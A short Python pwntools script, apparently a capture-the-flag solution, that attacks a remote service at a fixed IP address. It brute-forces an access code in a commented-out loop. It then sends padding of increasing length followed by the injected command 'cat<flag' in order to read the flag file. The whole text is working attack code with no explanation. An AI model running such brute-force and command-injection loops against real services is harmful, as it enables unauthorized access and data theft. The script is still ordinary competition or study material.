from pwn import *
import sys

context.log_level = 'debug'
leaked_number = 22
fp = open('readlpp', 'wb')
'''
i = 23
while(i<0x10000):
    i = i+1
    try:
        io = remote('218.2.197.235', 23749)
        io.recvuntil('access code:\n')
        io.sendline(str(i))
    except:
        print 'connecet error', hex(i)
    try:
        data = io.recvuntil('Wrong number!')[:-13]
        if len(data)>0:
            print data
            print 'cn ok', hex(i)
            sys.exit(0)
    except:
        print 'cn ok', hex(i)
        sys.exit(0)
        pass
    #print io.recv(4)
    io.close()
'''
raw_input('start?')
'''
for i in range(0, 0x1000):
    io = remote('218.2.197.235', 23749)
    io.recvuntil('access code:\n')
    io.sendline(str(leaked_number))
    io.recvuntil('input:\n')
    io.sendline('a'*i+'cat<flag')
    print 'len', hex(i)
    #io.sendline('cat<flag')
    try:
        print io.recvuntil('}')
        sys.exit(0)
    except:
        pass
    io.close()
'''

for i in range(0x3e0, 0x1000):
    io = remote('218.2.197.235', 23749)
    io.recvuntil('access code:\n')
    io.sendline(str(leaked_number))
    io.recvuntil('input:\n')
    io.sendline('cat')
    io.recvuntil('name?')
    print 'len', hex(i)
    io.sendline('a'*i + 'cat<flag')
    try:
        print io.recvuntil('}')
        sys.exit(0)
    except:
        pass
    io.close()

fp.close()

